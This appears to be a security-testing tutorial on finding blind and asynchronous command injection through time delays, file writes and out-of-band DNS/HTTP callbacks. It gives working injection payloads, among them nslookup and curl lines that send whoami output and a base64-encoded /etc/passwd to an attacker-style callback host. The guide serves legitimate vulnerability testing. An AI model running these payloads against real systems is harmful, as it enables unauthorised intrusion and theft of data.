# Blind & OAST Detection Techniques

Many command injection vulnerabilities are completely invisible from the application's response — the command executes in a background job, a queue worker, a cron task, or simply isn't reflected anywhere — and the only way to find these is to make the vulnerable system reach out to you, rather than waiting for it to show you something.

## Time-delay detection

The simplest blind technique: inject a command that pauses execution, and measure whether the response (or, for async contexts, a later poll) takes measurably longer.

```
Linux:
  ping -c 10 127.0.0.1     (≈10 second delay, looks like ordinary
                              network diagnostic traffic to casual
                              log review)
  sleep 10

Windows:
  ping 127.0.0.1 -n 10
  timeout 10
```

**Always run a control comparison**, not a single trial: send the delay payload several times and a non-delay baseline several times, and compare the distributions — a single slow response proves nothing on its own given normal backend/network jitter. If the delay is consistently and specifically present only when your payload is, that's a confirmed signal.

## File-write validation

If you suspect injection but have no other way to observe output, write a recognizable value to a location you can independently check via HTTP (a web-accessible directory) or via another part of the application that reads from disk:

```
whoami > /var/www/html/whoami.txt
whoami > C:\inetpub\wwwroot\whoami.txt
```
Then simply request `/whoami.txt` directly. This converts a blind injection into a directly viewable one for the rest of your testing and for the report's proof-of-concept — far more convincing to a triager than a timing graph.

## DNS/HTTP OAST (out-of-band) callbacks

This is the most reliable technique for **asynchronous** command injection — where the command runs in a background process or service disconnected from your HTTP request entirely, so neither direct output nor response timing will ever reveal anything. Instead, you make the vulnerable system initiate its own outbound connection to infrastructure you control (Burp Collaborator or interactsh), which works even when:
```
- The command executes in a queue worker minutes after your request
- The HTTP response is generated before the injected command even runs
- The application actively suppresses errors/output/timing differences
```

**Basic confirmation:**
```
& nslookup attacker-oast-subdomain.oastify.com &
```
A DNS interaction arriving at your Collaborator/interactsh log confirms execution, independent of anything the HTTP response shows.

**Exfiltrating actual command output via DNS**, by embedding the result of a command directly into the subdomain being looked up:
```
& nslookup `whoami`.attacker-oast-subdomain.oastify.com &
& nslookup $(whoami).attacker-oast-subdomain.oastify.com &
```
The Collaborator/interactsh log shows the resolved subdomain, which contains the literal output of `whoami` baked into the DNS query — decode/read it directly from the interaction log.

**For longer output**, DNS labels are limited to 63 characters and full hostnames to roughly 253, so base32/base64-encode the data first (DNS labels can't safely contain `+`, `/`, `=` from standard base64 — use base32, or a base64 variant with those characters stripped/substituted) and, for anything longer than one label's worth, split it into multiple chunked queries:
```
encoded=$(whoami | base32 | tr -d '=')
nslookup ${encoded}.attacker-oast-subdomain.oastify.com
```
For output longer than ~50-60 characters, chunk it into multiple sequential lookups rather than relying on one oversized label.

**HTTP-based exfiltration**, when you'd rather move more data per request or the target's DNS egress is restricted:
```
& curl http://attacker-oast-subdomain.oastify.com/$(whoami) &
& curl -d "$(cat /etc/passwd | base64)" http://attacker-oast-subdomain.oastify.com/exfil &
```

## Workflow for a suspected async injection point

```
1. Identify the candidate feature (anything that triggers a background
   job: report generation, scheduled exports, webhook processing,
   email-on-signup, etc.).
2. Send your normal request with an OAST payload in the suspect
   parameter, using a freshly generated Collaborator/interactsh
   subdomain.
3. Poll the Collaborator/interactsh log — repeatedly and patiently,
   since async execution may be delayed by seconds to minutes
   depending on the queue/cron schedule.
4. On a confirmed interaction, escalate to the output-exfiltration
   payloads above to recover `whoami`/`id` output as your proof,
   rather than stopping at "a DNS lookup happened."
```

## Confirming, not just attempting

A finding needs an actual interaction logged on infrastructure you control, ideally containing recognizable exfiltrated output — not "I sent an OAST payload." If nothing arrives after a reasonable polling window, reconsider whether the parameter is really reachable by a shell at all, whether egress filtering on the target blocks outbound DNS/HTTP, or whether a different parameter/feature is the actual sink, rather than concluding the technique itself failed.
